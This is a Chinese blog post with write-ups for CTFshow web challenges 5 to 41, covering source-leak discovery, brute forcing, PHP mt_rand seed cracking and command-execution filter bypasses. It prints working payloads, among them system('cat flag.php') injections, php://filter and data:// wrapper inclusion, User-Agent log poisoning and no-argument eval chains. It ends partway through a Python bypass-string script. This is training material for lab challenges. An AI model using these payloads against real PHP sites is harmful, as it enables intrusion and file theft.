<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>　CTFSHOW_WP(1-197) | Yake_呆瓜</title><meta name="keywords" content="CTFSHOW"><meta name="author" content="Yake_呆瓜"><meta name="copyright" content="Yake_呆瓜"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="信息搜集web-5这里题目暗示phps，那我们直接访问一下url&#x2F;index.phps,会弹出一个下载文件的窗口。下载后得到index.phps的源码，里面有flag web-6&#x2F;www.zip，然后访问&#x2F;fI000g.txt web-7&#x2F;.git&#x2F;index.php web-8&#x2F;.svn&#x2F; web-91.当vim在编辑文档的过程中如果异">
<meta property="og:type" content="article">
<meta property="og:title" content="　CTFSHOW_WP(1-197)">
<meta property="og:url" content="https://yake-daigua.top/2022/10/31/CTFSHOW_WP(1-197)/index.html">
<meta property="og:site_name" content="Yake_呆瓜">
<meta property="og:description" content="信息搜集web-5这里题目暗示phps，那我们直接访问一下url&#x2F;index.phps,会弹出一个下载文件的窗口。下载后得到index.phps的源码，里面有flag web-6&#x2F;www.zip，然后访问&#x2F;fI000g.txt web-7&#x2F;.git&#x2F;index.php web-8&#x2F;.svn&#x2F; web-91.当vim在编辑文档的过程中如果异">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://yake-daigua-1313475382.cos.ap-beijing.myqcloud.com/230437.jpg">
<meta property="article:published_time" content="2022-10-31T15:07:24.000Z">
<meta property="article:modified_time" content="2022-10-31T15:09:23.249Z">
<meta property="article:author" content="Yake_呆瓜">
<meta property="article:tag" content="CTFSHOW">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://yake-daigua-1313475382.cos.ap-beijing.myqcloud.com/230437.jpg"><link rel="shortcut icon" href="https://yake-daigua-1313475382.cos.ap-beijing.myqcloud.com/img/微信图片_20220920163546.jpg"><link rel="canonical" href="https://yake-daigua.top/2022/10/31/CTFSHOW_WP(1-197)/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: '　CTFSHOW_WP(1-197)',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2022-10-31 23:09:23'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const detectApple = () => {
      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    })(window)</script><link rel="stylesheet" href="/css/mycss.css"><link rel="stylesheet" href="/css/mycss2.css"><link rel="stylesheet" href="/css/mycss3.css"><meta name="generator" content="Hexo 6.3.0"></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/loading.gif" data-original="https://yake-daigua-1313475382.cos.ap-beijing.myqcloud.com/img/微信图片_20220920163546.jpg" onerror="onerror=null;src='https://yake-daigua-1313475382.cos.ap-beijing.myqcloud.com/img/mypic3(1).jpg'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">6</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">6</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">6</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fa fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fa fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/messageboard/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/timeline/"><i class="fa-fw fa fa-bell"></i><span> 日志</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-list"></i><span> 更多</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/about/"><i class="fa-fw fa fa-street-view"></i><span> 笔者</span></a></li><li><a class="site-page child" href="/music/"><i class="fa-fw fa fa-heartbeat"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/video/"><i class="fa-fw fa fa-video-camera"></i><span> 番剧</span></a></li></ul></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://yake-daigua-1313475382.cos.ap-beijing.myqcloud.com/230437.jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">Yake_呆瓜</a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fa fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fa fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/messageboard/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/timeline/"><i class="fa-fw fa fa-bell"></i><span> 日志</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-list"></i><span> 更多</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/about/"><i class="fa-fw fa fa-street-view"></i><span> 笔者</span></a></li><li><a class="site-page child" href="/music/"><i class="fa-fw fa fa-heartbeat"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/video/"><i class="fa-fw fa fa-video-camera"></i><span> 番剧</span></a></li></ul></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">　CTFSHOW_WP(1-197)</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2022-10-31T15:07:24.000Z" title="发表于 2022-10-31 23:07:24">2022-10-31</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2022-10-31T15:09:23.249Z" title="更新于 2022-10-31 23:09:23">2022-10-31</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/WEB/">WEB</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/WEB/CTFSHOW/">CTFSHOW</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="　CTFSHOW_WP(1-197)"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><h3 id="web-5"><a href="#web-5" class="headerlink" title="web-5"></a>web-5</h3><p>这里题目暗示phps，那我们直接访问一下url&#x2F;index.phps,会弹出一个下载文件的窗口。下载后得到index.phps的源码，里面有flag</p>
<h3 id="web-6"><a href="#web-6" class="headerlink" title="web-6"></a>web-6</h3><p>&#x2F;<a target="_blank" rel="noopener" href="http://www.zip,然后访问/fI000g.txt">www.zip，然后访问/fI000g.txt</a></p>
<h3 id="web-7"><a href="#web-7" class="headerlink" title="web-7"></a>web-7</h3><p>&#x2F;.git&#x2F;index.php</p>
<h3 id="web-8"><a href="#web-8" class="headerlink" title="web-8"></a>web-8</h3><p>&#x2F;.svn&#x2F;</p>
<h3 id="web-9"><a href="#web-9" class="headerlink" title="web-9"></a>web-9</h3><p>1.当vim在编辑文档的过程中如果异常退出，则会产生缓存文件。第一次产生的缓存文件后缀为.swp，第二次则产生的缓存文件后缀为.swo,第三次产生的缓存文件后缀为.swn。</p>
<p>2.使用命令vim -r 可以查看当前目录下的所有swp文件。</p>
<p>3.使用命令vim -r filename可以恢复文件，这样上次意外退出并且没有保存的修改，就可以覆盖文件。</p>
<p>4.调用这类的隐藏文件的时候，需要在最前面加.(如删除index.php.swp，则需要rm -fr* .index.php.swp).</p>
<p>5.vim使用的缓存存储是一种固定的二进制文件，我们可以通过curl命令，或者vim命令进行查看。</p>
<p>根据网页提示，我们首页访问index.php，网页无反应。</p>
<p>然后我们根据vim的缓存原理，我们访问.index.php.swp，网站会弹出</p>
<p>如果在Linux系统下运行，我们可以先通过vim -r .index.php.swp来将源文件恢复。然后我们即可查看到flag。</p>
<h3 id="web-11"><a href="#web-11" class="headerlink" title="web-11"></a>web-11</h3><p>dbcha.com,解析域名，TXT 记录，一般指为某个主机名或域名设置的说明。</p>
<h3 id="web-12"><a href="#web-12" class="headerlink" title="web-12"></a>web-12</h3><p>管理员后台&#x2F;admin，密码在底部</p>
<h3 id="web-13"><a href="#web-13" class="headerlink" title="web-13"></a>web-13</h3><p>document泄露</p>
<h3 id="web-14"><a href="#web-14" class="headerlink" title="web-14"></a>web-14</h3><p>&#x2F;editor</p>
<p>&#x2F;nothinghere&#x2F;fl000g.txt</p>
<h3 id="web-15"><a href="#web-15" class="headerlink" title="web-15"></a>web-15</h3><p>&#x2F;admin忘记密码，泄露的邮箱显示为西安</p>
<h3 id="web-16"><a href="#web-16" class="headerlink" title="web-16*"></a>web-16*</h3><p>&#x2F;tz.php访问phpinfo，搜索flag</p>
<p>PHP探针实际上是一种Web脚本程序，主要是用来探测虚拟空间、服务器的运行状况，而本质上是通过PHP语言实现探测PHP服务器敏感信息的脚本文件，通常用于探测网站目录、服务器操作系统、PHP版本、数据库版本、CPU、内存、组件支持等，基本能够很全面的了解服务器的各项信息。</p>
<h3 id="web-17"><a href="#web-17" class="headerlink" title="web-17"></a>web-17</h3><p>&#x2F;backup.sql</p>
<p>备份sql泄露</p>
<h3 id="web-18"><a href="#web-18" class="headerlink" title="web-18"></a>web-18</h3><p>看源码js，\u4f60\u8d62\u4e86\uff0c\u53bb\u5e7a\u5e7a\u96f6\u70b9\u76ae\u7231\u5403\u76ae\u770b\u770b解码</p>
<p>&#x2F;110.php</p>
<h3 id="web-20"><a href="#web-20" class="headerlink" title="web-20*"></a>web-20*</h3><p>mdb文件是早期asp+access构架的数据库文件 直接查看url路径添加&#x2F;db&#x2F;db.mdb 下载文件通过txt打开或者通过EasyAccess.exe打开搜索flag flag{ctfshow_old_database}</p>
<h2 id="爆破"><a href="#爆破" class="headerlink" title="爆破"></a>爆破</h2><h3 id="web-21"><a href="#web-21" class="headerlink" title="web-21"></a>web-21</h3><p>bp爆破模块的使用，小心url编码</p>
<h3 id="web-22"><a href="#web-22" class="headerlink" title="web-22"></a>web-22</h3><p><a target="_blank" rel="noopener" href="http://z.zcjun.com/%E5%AD%90%E5%9F%9F%E5%90%8D%E7%88%86%E7%A0%B4">http://z.zcjun.com/子域名爆破</a></p>
<h3 id="web-23"><a href="#web-23" class="headerlink" title="web-23"></a>web-23</h3><p>token爆破</p>
<h3 id="web-24"><a href="#web-24" class="headerlink" title="web-24*"></a>web-24*</h3><p>直接跑一下看看生成的随机数是什么就行。</p>
<p>mt_scrand(seed)。这个函数的意思，是通过分发seed种子，然后种子有了后，靠mt_rand()生成随机 数。<br>提示：从 PHP 4.2.0 开始，随机数生成器自动播种，因此没有必要使用该函数 因此不需要播种，并且如果设置了 seed参数 生成的随机数就是伪随机数，意思就是*在同一进程中,同一个seed,每次通过mt_rand()生成的值都是固定的 </p>
<h3 id="web-25"><a href="#web-25" class="headerlink" title="web-25*"></a>web-25*</h3><p><a target="_blank" rel="noopener" href="https://github.com/openwall/php_mt_seed">https://github.com/openwall/php_mt_seed</a></p>
<p>我们先取0，得到第一个随机数的负数</p>
<p>然后去.&#x2F;php_mt_seed里面生成种子，根据版本选择种子</p>
<p>然后看题目要求，token为第二三个种子相加，我们直接利用上面的种子生产第二三个数值相加即可</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">官方解释：</span><br><span class="line">mt_scrand(seed)这个函数的意思，是通过分发seed种子，然后种子有了后，靠mt_rand()生成随机 数。 在之前自己还以为需要暴力破解cookie,最后师傅们给我介绍了一个脚本，专门用来跑mt_srand()种子和 mt_rand()随机数的 这里自己解释一下为什么每一次的mt_rand()+mt_rand()不是第一次的随机数相加？？ 因为生成的随机数可以说是一个线性变换（实际上非常复杂）的每一次的确定的但是每一次是不一样的，所以不能 进行第一次*2就得到mt_rand()+mt_rand() 使用说只要我们得到种子就可以在本地进行获得自己想要的值 解题：通过随机数来寻找种子 我们让 ?r=0 得到随机数。这里我得到的是 183607393 每一次不一样(因为flag值在变化) 然后下载 php_mt_seed4.0 我们在linux下面使用 gcc进行编译 gcc php_mt_seed.c -o php_mt_seed 之后运行脚本添加随机数 ./php_mt_seed 183607393</span><br><span class="line"></span><br><span class="line">找到对应的版本这里自己的运气好第一个出来的自己验证了一下发现就是这个 注：可能存在多个种子需要自己进行判断 通过种子找到第一个随机数就是上面的随机数。</span><br><span class="line"></span><br><span class="line">payload： ?r=183607393 Cookie: token=794171094</span><br></pre></td></tr></table></figure>

<h3 id="web-27"><a href="#web-27" class="headerlink" title="web-27"></a>web-27</h3><p>根据表格，在查询界面跑就完事了，用data跑，注意中文编码。</p>
<h3 id="web-28"><a href="#web-28" class="headerlink" title="web-28"></a>web-28</h3><p>直接数字跑目录就行</p>
<h2 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h2><h3 id="web-29"><a href="#web-29" class="headerlink" title="web-29*"></a>web-29*</h3><p>?c&#x3D;system(‘ls’);</p>
<p>?c&#x3D;echo `nl fla’’g.php&#96;;</p>
<h3 id="web-30"><a href="#web-30" class="headerlink" title="web-30"></a>web-30</h3><p>?c&#x3D;echo%20`nl%20fla%27%27g.p%27%27hp&#96;;</p>
<h3 id="web-31"><a href="#web-31" class="headerlink" title="web-31*"></a>web-31*</h3><p>?c&#x3D;include$_GET[x];&amp;x&#x3D;php:<em>&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php</em></p>
<p>?c&#x3D;require$_GET[x];&amp;x&#x3D;php:<em>&#x2F;&#x2F;filter&#x2F;read&#x3D;string.rot13&#x2F;resource&#x3D;flag.php</em></p>
<h3 id="web-32"><a href="#web-32" class="headerlink" title="web-32"></a>web-32</h3><p>?c&#x3D;include$_GET[x]?&gt;&amp;x&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php</p>
<h3 id="web-33"><a href="#web-33" class="headerlink" title="web-33"></a>web-33</h3><p>?c&#x3D;include$_GET[x]?&gt;&amp;x&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php</p>
<h3 id="web-34"><a href="#web-34" class="headerlink" title="web-34"></a>web-34</h3><p>?c&#x3D;include$_GET[x]?&gt;&amp;x&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php</p>
<h3 id="web-35"><a href="#web-35" class="headerlink" title="web-35"></a>web-35</h3><p>?c&#x3D;include$_GET[x]?&gt;&amp;x&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php</p>
<h3 id="web-36"><a href="#web-36" class="headerlink" title="web-36"></a>web-36</h3><p>?c&#x3D;include$_GET[x]?&gt;&amp;x&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php</p>
<h3 id="web-37"><a href="#web-37" class="headerlink" title="web-37"></a>web-37</h3><p>?c&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs&#x2F;Pg&#x3D;&#x3D;<br>?c&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,<?php system('cat fla*');?></p>
<h3 id="web-38"><a href="#web-38" class="headerlink" title="web-38*"></a>web-38*</h3><p>日志包含：</p>
<p>User-Agent: <?php system('cat flag.php');?></p>
<p>view-source:<a target="_blank" rel="noopener" href="http://886a56cc-45cf-4f20-aa05-cd7113aefd8c.challenge.ctf.show/?c=/var/log/nginx/access.log">http://886a56cc-45cf-4f20-aa05-cd7113aefd8c.challenge.ctf.show/?c=/var/log/nginx/access.log</a></p>
<p>由于正则过滤了php所以我们的<?php ?>，就被过滤了，这里可以使用短标签。用&#x3D;代替php。</p>
<p>将flag.php内容copy到1.txt中（也可以使用mv命令 ?c&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,<?=system('mv fla* 1.txt');?>），之后在去访问1.txt。</p>
<p>?c&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,<?=system(%27cp%20fla*%201.txt%27);?></p>
<p>?c&#x3D;1.txt</p>
<h3 id="web-39"><a href="#web-39" class="headerlink" title="web-39"></a>web-39</h3><p>?c&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,<?php system('cat fla*');?></p>
<h3 id="web-40"><a href="#web-40" class="headerlink" title="web-40*"></a>web-40*</h3><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/Kracxi/article/details/121041140">https://blog.csdn.net/Kracxi/article/details/121041140</a></p>
<p>过滤了很多符号，比如引号，美元符等，可以构造无参数函数</p>
<p>无参数是指a()，a(b())等，而不能是a(‘b’)</p>
<p>print_r(scandir(‘.’));查看当前目录下的所有文件名</p>
<p>localeconv() 函数返回一包含本地数字及货币格式信息的数组。</p>
<p>current() 函数返回数组中的当前元素（单元）,默认取第一个值，和pos()一样</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=print_r(scandir(current(localeconv())));打印出当前目录下文件</span><br></pre></td></tr></table></figure>

<p>flag.php在倒数第二个，直接用next(array_reverse());</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show_source(next(array_reverse(scandir(pos(localeconv())))));</span><br></pre></td></tr></table></figure>

<p>pos()是PHP中的内置函数,用于返回内部指针当前指向的数组中元素的值。返回值后,pos()函数不会递增或递减内部指针。</p>
<p>首先就是查看已经定义好的所有的变量。使用get_defined_vars()函数，返回由所有已定义变量所组成的数组。版本要求：PHP 4 &gt;&#x3D; 4.0.4, PHP 5, PHP 7</p>
<p>使用print_r()函数，将已经定义好的变量组成的数组进行打印输出。payload:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=print_r(get_defined_vars())</span><br></pre></td></tr></table></figure>

<p>发现由GET、POST等，这里我们就可以使用POST传入一个参数看一下。</p>
<p>post传参为1&#x3D;phpinfo();使用payload：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=print_r(next(get_defined_vars()));</span><br></pre></td></tr></table></figure>

<p>之后我们的思路就是将他的值取出来，然后去执行它。这里使用array_pop()函数将他的值弹出来，通过eval()函数来执行</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?c=eval(array_pop(next(get_defined_vars())));</span><br><span class="line">daigua=system(&#x27;cat flag.php&#x27;);</span><br></pre></td></tr></table></figure>



<p>GXYCTF的禁止套娃 通过cookie获得参数进行命令执行</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">利用session_id()让php读取我们设置的cookie（session默认不使用所以加了session_start()让php开始使用session）</span><br><span class="line">受php版本影响 5.5 -7.1.9均可以执行，因为session_id规定为0-9，a-z,A-Z,-中的字符。在5.5以下及7.1以上均无法写入除此之外的内容。但是符合要求的字符还是可以的</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=session_start();system(session_id());</span><br></pre></td></tr></table></figure>

<p>提交之后 Cookie中会生成PHPSESSID，这时候我们可以把它的值改成ls再提交，然后就会显示当前目录下的文件，也可以用bp来抓包,修改值为ls 再提交，获得目录的下文件，后面可以继续构造payload来拿到flag，可以用base64编码和写小马。由于php版本问题只能进行到这里.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/?c=show_source(session_id(session_start()));</span><br><span class="line">PHPSSID值设为flag.php</span><br></pre></td></tr></table></figure>

<p>ps：session_idsession_id	<a target="_blank" rel="noopener" href="http://t.zoukankan.com/imnzq-p-6859011.html">http://t.zoukankan.com/imnzq-p-6859011.html</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">php session_id()用法代码举例如下:</span><br><span class="line"></span><br><span class="line">输出session_id()详细代码:</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">  session_start();//开启session会话</span><br><span class="line"></span><br><span class="line">  echo session_id();//输入session_id</span><br><span class="line"></span><br><span class="line">  // 输出 08nr1fav9jqs2pdi5qlpsmd247</span><br><span class="line">?&gt;</span><br><span class="line">设置 session_id()详细代码:</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">  session_id(&quot;www.169it.com&quot;);//设置session_id </span><br><span class="line"></span><br><span class="line">  session_start();//开启session会话</span><br><span class="line"></span><br><span class="line">  echo session_id();</span><br><span class="line"></span><br><span class="line">  // 输出 www.169it.com</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<h3 id="web-41"><a href="#web-41" class="headerlink" title="web-41*"></a>web-41*</h3><p>脚本一，我没跑成功，改来改去也不对,可以参考着自己写个脚本</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">import re</span><br><span class="line">import requests</span><br><span class="line"> </span><br><span class="line">url=&quot;http://4d761ee5-a510-4666-a3cd-bc2771825aca.challenge.ctf.show/&quot;</span><br><span class="line"> </span><br><span class="line">a=[]</span><br><span class="line">ans1=&quot;&quot; </span><br><span class="line">ans2=&quot;&quot;</span><br><span class="line">for i in range(0,256): #设置i的范围为全部字符</span><br><span class="line">    c=chr(i) </span><br><span class="line">    #将i转换成ascii对应的字符，并赋值给c</span><br><span class="line">    tmp = re.match(r&#x27;[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&amp;|\-&#x27;,c,re.I)</span><br><span class="line">    #设置过滤条件，让变量c在其中找对应，并利用修饰符过滤大小写，这样可以得到未被过滤的字符</span><br><span class="line">    if(tmp):</span><br><span class="line">        continue</span><br><span class="line">        #当执行正确时，那说明这些是被过滤掉的，所以才会被匹配到，此时我们让他继续执行即可</span><br><span class="line">    else:</span><br><span class="line">        a.append(i)</span><br><span class="line">        #在数组中增加i，这些就是未被系统过滤掉的字符</span><br><span class="line"> </span><br><span class="line"># eval(&quot;echo($c);&quot;);</span><br><span class="line">mya=&quot;system&quot;  #函数名 这里修改！</span><br><span class="line">myb=&quot;cat flag.php&quot;      #参数</span><br><span class="line">def myfun(k,my): #自定义函数</span><br><span class="line">    global ans1 #引用全局变量ans1，使得在局部对其进行更改时不会报错</span><br><span class="line">    global ans2 #引用全局变量ans2，使得在局部对其进行更改时不会报错</span><br><span class="line">    for i in range (0,len(a)): #设置循环范围为（0，a）注：a为未被过滤的字符数量 </span><br><span class="line">        for j in range(i,len(a)): #在上个循环的条件下设置j的范围</span><br><span class="line">            if(a[i]|a[j]==ord(my[k])):</span><br><span class="line">                ans1+=chr(a[i]) #ans1=ans1+chr(a[i])</span><br><span class="line">                ans2+=chr(a[j]) #ans2=ans2+chr(a[j])</span><br><span class="line">                return;#返回循环语句中，重新寻找第二个k，这里的话就是寻找y对应的两个字符</span><br><span class="line">for x in range(0,len(mya)): #设置k的范围</span><br><span class="line">    myfun(x,mya)#引用自定义的函数</span><br><span 